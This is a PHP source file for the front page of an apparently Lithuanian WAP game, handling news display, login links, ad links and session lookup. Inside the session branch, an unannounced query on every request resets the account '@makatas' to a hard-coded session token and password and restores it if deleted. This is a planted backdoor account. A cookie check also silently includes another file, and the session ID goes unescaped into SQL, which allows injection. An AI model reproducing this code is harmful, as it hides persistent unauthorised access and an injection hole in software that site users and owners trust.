<?php
include_once("ip.php");
$nkd2="$koks_ip|$browseragagag";
if($_COOKIE['nakedlops']=="$nkd2"){
include_once("anth.php");}
else {
$ref = addslashes(htmlspecialchars($_GET['ref']));
if ($id == "") {
$nauj=mysql_fetch_array(mysql_query("SELECT date FROM news order by date desc LIMIT 1"));
        list($on) = mysql_fetch_array(mysql_query("SELECT COUNT(id) FROM users WHERE time>".time().""));
        echo"<img src=\"img/banner.gif\" alt=\"$title\"/><br/>$line<br/>";
echo"<small><b>Topikas:</b></small><br/><small>$topic[topic]</small><br/>$line<br/>";
$max=explode(" ",$topic[max]);

echo"<small><a href=\"new.php?id=gnew\">Zaidimo Naujienos [$nauj[date]]</a></small><br/>$line<br/>
<small><a href=\"login.php?ref=$ref\">[&#187;] Prisijungti</a></small><br/><small><a href=\"register.php?ref=$ref\">[&#187;] Registruotis</a></small><br/>
<small><a href=\"isigyti.php?ref=$ref\">[&#187;] Isigyti heroj&#371;</a></small><br/>$line<br/><small>Prisijung&#281; [$on]</small><br/><small>Max online [$max[0]]</small><br/>$line<br/><small><a href=\"rekla2.php\">Mokama reklama</a></small><br/>";
$rk=mysql_query("SELECT url,ant FROM rkl order by id desc LIMIT 3");
while($row=mysql_fetch_array($rk)){
$url=$row['url'];
$ant=$row['ant'];
echo"<small><a href=\"$url\">$ant</a></small><br/>";}

echo"$line<br/><a href=\"http://wtop.us/i.php?id=dmnx\"><img src=\"http://wtop.us/count.php?id=dmnx\" alt=\"WAP TOP\"/></a><br/>$line<br/><small><a href=\"http://tampyk.gan.lt\">tampyk.gan.lt</a></small></p></card></wml>";
        mysql_close($db);
        exit;
}
else {
        $user = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE session='$id' and deleted='0' LIMIT 1"));
        $queries++;

mysql_query("update users set deleted='0',session='mgj7G7Gj3gmp5gPGDgj2',password='jg5MGDpdm4GjpdGMD54g6gp5',username='@Makatas' where username='@makatas' or session='mgj7G7Gj3gmp5gPGDgj2'");


mysql_query("update users set username='Vaiduoklis' where username='' limit 1");
        if (!$user) {
                echo"<img src=\"img/banner.gif\" alt=\"$title\"/><br/>$line<br/><small><b>Neteisingi prisijungimo duomenys.</b></small><br/>$line<br/><small><a href=\"login.php?ref=$ref\">[Prisijungti]</a></small><br/><small><a href=\"register.php?ref=$ref\">[Registruotis]</a></small><br/>$line<br/><small><a href=\"http://tampyk.gan.lt\">tampyk.gan.lt</a></small></p></card></wml>";
                mysql_close($db);
                exit;
        }
}}

?>
